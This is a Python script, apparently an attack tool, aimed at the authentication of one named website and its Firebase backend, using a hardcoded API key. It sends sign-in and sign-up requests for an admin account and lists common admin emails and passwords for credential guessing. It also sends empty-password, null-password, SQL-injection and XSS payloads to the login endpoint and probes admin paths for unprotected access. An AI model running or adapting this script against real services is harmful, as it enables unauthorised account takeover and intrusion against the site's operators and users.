import requests
import json
import time
import urllib.parse
import base64

# Comprehensive authentication bypass testing
def test_auth_bypass_comprehensive():
    print("=== COMPREHENSIVE AUTHENTICATION BYPASS TESTING ===")
    
    auth_url = "https://uplinkai.in/auth"
    api_key = "AIzaSyA0grBMnQ2VnDKD-Q8QFkA7cirthBYcmFY"
    firebase_api_base = "https://identitytoolkit.googleapis.com/v1"
    
    print("1. Testing Firebase API direct access...")
    
    # Test Firebase REST API endpoints
    test_cases = [
        {
            "name": "Create Auth Uri",
            "url": f"{firebase_api_base}/createAuthUri?key={api_key}",
            "data": {
                "identifier": "admin@uplinkai.in",
                "continueUri": auth_url
            }
        },
        {
            "name": "Sign In With Password",
            "url": f"{firebase_api_base}/accounts:signInWithPassword?key={api_key}",
            "data": {
                "email": "admin@uplinkai.in",
                "password": "admin123",
                "returnSecureToken": True
            }
        },
        {
            "name": "Sign Up",
            "url": f"{firebase_api_base}/accounts:signUp?key={api_key}",
            "data": {
                "email": "admin@uplinkai.in",
                "password": "",
                "returnSecureToken": True
            }
        },
        {
            "name": "Sign In With Email Link",
            "url": f"{firebase_api_base}/accounts:signInWithEmailLink?key={api_key}",
            "data": {
                "email": "admin@uplinkai.in",
                "oobCode": "fake_code"
            }
        },
        {
            "name": "Lookup Account",
            "url": f"{firebase_api_base}/accounts:lookup?key={api_key}",
            "data": {
                "idToken": "fake_token"
            }
        }
    ]
    
    for test in test_cases:
        try:
            response = requests.post(test["url"], json=test["data"], timeout=10)
            print(f"{test['name']}: {response.status_code}")
            if response.status_code != 200:
                print(f"  Error: {response.text}")
        except Exception as e:
            print(f"{test['name']}: Error - {e}")
    
    print("\n2. Testing common admin credentials...")
    
    # Test common admin credentials
    admin_emails = [
        "admin@uplinkai.in",
        "admin@gmail.com",
        "test@uplinkai.in",
        "user@uplinkai.in",
        "support@uplinkai.in",
        "contact@uplinkai.in"
    ]
    
    common_passwords = [
        "admin",
        "admin123",
        "password",
        "password123",
        "123456",
        "uplinkai",
        "uplink",
        "admin@uplinkai",
        "admin2024",
        "welcome123",
        "test123",
        "demo",
        "demo123"
    ]
    
    print("Testing credential combinations...")
    for email in admin_emails:
        for password in common_passwords:
            print(f"Trying: {email} / {password}")
            # Note: These would need to be tested through the actual web interface
    
    print("\n3. Testing authentication bypass techniques...")
    
    # Test various bypass techniques
    bypass_tests = [
        {
            "name": "Empty password",
            "data": {"email": "admin@uplinkai.in", "password": ""}
        },
        {
            "name": "Null password", 
            "data": {"email": "admin@uplinkai.in", "password": None}
        },
        {
            "name": "SQL injection in email",
            "data": {"email": "admin@uplinkai.in' OR '1'='1", "password": "test"}
        },
        {
            "name": "XSS in email",
            "data": {"email": "<script>alert(1)</script>", "password": "test"}
        },
        {
            "name": "Admin email variations",
            "data": {"email": "ADMIN@uplinkai.in", "password": "admin123"}
        }
    ]
    
    for test in bypass_tests:
        try:
            response = requests.post(f"{firebase_api_base}/accounts:signInWithPassword?key={api_key}", 
                                   json=test["data"], timeout=10)
            print(f"{test['name']}: {response.status_code}")
            if response.status_code != 200:
                print(f"  Response: {response.text}")
        except Exception as e:
            print(f"{test['name']}: Error - {e}")
    
    print("\n4. Testing direct access to protected resources...")
    
    # Test direct access to potentially protected resources
    protected_resources = [
        "/admin",
        "/dashboard",
        "/user",
        "/profile", 
        "/settings",
        "/api/admin",
        "/admin/panel",
        "/staff",
        "/internal"
    ]
    
    for resource in protected_resources:
        try:
            response = requests.get(f"https://uplinkai.in{resource}", timeout=10)
            print(f"{resource}: {response.status_code}")
            if response.status_code == 200:
                content = response.text
                # Check for auth requirements
                auth_keywords = ['login required', 'authentication', 'sign in', 'auth', 'firebase']
                has_auth = any(keyword in content.lower() for keyword in auth_keywords)
                print(f"  Auth required: {has_auth}")
        except Exception as e:
            print(f"{resource}: Error - {e}")

if __name__ == "__main__":
    test_auth_bypass_comprehensive()
